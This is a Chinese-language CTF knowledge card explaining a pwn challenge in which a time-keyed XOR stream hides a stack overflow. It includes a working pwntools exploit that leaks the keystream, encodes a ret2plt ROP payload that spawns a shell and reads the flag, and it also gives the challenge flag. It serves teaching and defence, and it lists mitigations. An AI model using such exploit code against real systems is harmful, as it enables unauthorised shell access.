---
id: ctf-pwn-time-keyed-xor-stream-stack-overflow
title: 按分钟派生 XOR 流 + 栈溢出 ROP：先泄 keystream 再编码 payload
type: scenario
domain: ctf
path: ctf/pwn
technique: time-keyed-xor-stream-stack-overflow
tags:
- pwn
- stack-overflow
- xor
- keystream
- time
- i386
- ret2libc
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:09:01+08:00'
  notes: 已对照原文核对：按分钟派生 32 位 key、每 4 字节 XOR 且 key+1、发 40 个 0 泄 keystream、read_user_input 偏移 68、system@plt 0x080490b0/main 0x0804935f//bin/sh 0x0804a018、等 0x28 回显后再发命令均一致；卡片把原文真实远程地址替换为示例域名。未验证点：无二进制附件，PoC 未复跑；CTF 题无受影响版本；frontmatter 无 sources/source_url。
url: /docs/ctf/pwn/ctf-pwn-time-keyed-xor-stream-stack-overflow/
draft: false
kb_aliases:
- Whats the Time?
- i386
- XOR keystream
- system@plt
- /bin/sh
- 时间密钥
---

## 一句话结论

i386 程序把用户输入用“当前分钟”派生的 4 字节递增 XOR 流加密，且 `read_user_input()` 存在偏移 68 的栈溢出；先发送 40 个 `\x00` 让程序回显 keystream（前 4 字节即 key），再用同一分钟的 key 编码 `A*68 + system@plt + main + "/bin/sh"`，发送后等回显结束即可拿 shell 读 flag。

## 原理

- **时间派生密钥**：程序按当前时间（分钟）生成 32 位 key；对输入每 4 字节一块，用 `p32(key)` 异或，然后 `key += 1`。同一分钟内 key 相同，跨分钟会变。
- **keystream 泄露**：加密是 XOR，发送 40 个 `\x00` 后，程序回显的 40 字节就是 keystream 本身；前 4 字节即初始 key，后续每 4 字节递增 1。
- **栈溢出**：`read_user_input()` 的缓冲区到返回地址偏移 68；输入先被解密再 `read`/`strcpy`，所以溢出 payload 必须先按 keystream 编码。
- **ROP**：i386 参数在栈上；payload 布局 `[A*68][system@plt][main]["/bin/sh"]`，`system` 返回后回 `main` 保持稳定；`/bin/sh` 用二进制里现成字符串 `0x0804a018`。
- **时序**：泄露 key 和发送 exploit 必须在同一分钟；脚本比较两次的 `Currently the time is:` 行，不同就重试。
- **回显**：程序会先 write 回前 `0x28` 字节；等回显结束再发 `cat flag...`，避免命令被当作输入吞掉。
- **结果**：`texsaw{7h4nk_u_f0r_y0ur_71m3}`。

## 触发条件

- 程序对输入做时间/种子派生的 XOR 流加密，密钥可预测或可泄露。
- 存在栈溢出且能控制返回地址（无 canary 或可绕过）。
- 能观察程序回显（用于泄 keystream/同步）。
- 目标有 `system@plt` 和 `/bin/sh` 字符串，或可 ret2libc。

## 利用步骤

1. 逆向确认 key 派生（时间/分钟/秒）、XOR 流递增规则、溢出偏移。
2. 发送 `\x00` 长度 ≥ 需要的 keystream 长度，读取回显；前 4 字节为 key。
3. 构造 ROP payload：`padding(offset) + system@plt + 返回地址 + /bin/sh`。
4. 用泄露的 key 按同样规则编码 payload（每 4 字节 XOR `p32(key)`，key 递增）。
5. 在同一时间窗口内发送编码后的 payload；读取 `0x28` 字节回显。
6. 回显结束后发送 `cat flag.txt || cat /flag`，读取 flag；跨分钟则重试。

## PoC

```python
from pwn import *

context.arch = "i386"
context.os = "linux"
HOST, PORT = "chals.example.org", 3000
OFFSET = 68
LEAK_LEN = 0x28
SYSTEM_PLT = 0x080490b0
MAIN = 0x0804935f
BINSH = 0x0804a018

def encode_with_key(data, key):
    out = bytearray(data)
    k = key & 0xffffffff
    for i in range(0, len(out), 4):
        block = p32(k)
        for j in range(4):
            out[i + j] ^= block[j]
        k = (k + 1) & 0xffffffff
    return bytes(out)

def leak_key():
    io = remote(HOST, PORT)
    shown = io.recvuntil(b"Currently the time is: ")
    t = io.recvline()
    io.send(b"\x00" * LEAK_LEN)
    leak = io.recvn(LEAK_LEN)
    key = u32(leak[:4])
    io.close()
    return t, key

while True:
    t1, key = leak_key()
    io = remote(HOST, PORT)
    io.recvuntil(b"Currently the time is: ")
    t2 = io.recvline()
    if t1 != t2:
        io.close(); continue

    payload = flat(b"A" * OFFSET, p32(SYSTEM_PLT), p32(MAIN), p32(BINSH))
    assert len(payload) % 4 == 0
    io.send(encode_with_key(payload, key))
    io.recvn(LEAK_LEN)  # 等程序回显完
    io.sendline(b"cat flag.txt || cat /flag || cat /home/ctf/flag.txt; exit")
    print(io.recvall(timeout=2).decode(errors="ignore"))
    break
```

## 变体与关联

- **密钥派生变体**：时间（分钟/秒）、`time(NULL)` 种子、LCG/MT19937、PID/uptime；先确认可预测性。
- **泄露变体**：发送全 0 泄 keystream；发送已知明文对比；利用回显/错误消息。
- **溢出变体**：`gets`/`read`/`strcpy`；i386 栈传参 vs amd64 寄存器传参；ret2plt/ret2libc。
- **关联卡片**：[[binary-pwn-stack-ret2text-win-plus-one-align]]（ret2text）、[[binary-pwn-format-string-canary-libc-leak-rop-system]]（泄露+ROP）、[[crypto-prng-observable-pid-uptime-derived-admin-secret-token-forgery]]（可预测种子派生密钥）。
- **边界**：若 key 不可预测（CSPRNG）或跨分钟无法对齐，泄露/重放失败；若开启 canary/ASLR 需额外泄露。

## 检测与防御

- **防御**：不要用时间/可预测种子做加密密钥；使用 CSPRNG/服务端密钥；开启 canary、ASLR、NX、PIE。
- **检测信号**：程序按分钟变化行为；输入全 0 回显非零；栈溢出偏移固定；`system@plt`/`/bin/sh` 可用。
- **CTF 技巧**：先泄 keystream 再编码 payload；注意同一时间窗口和回显同步。
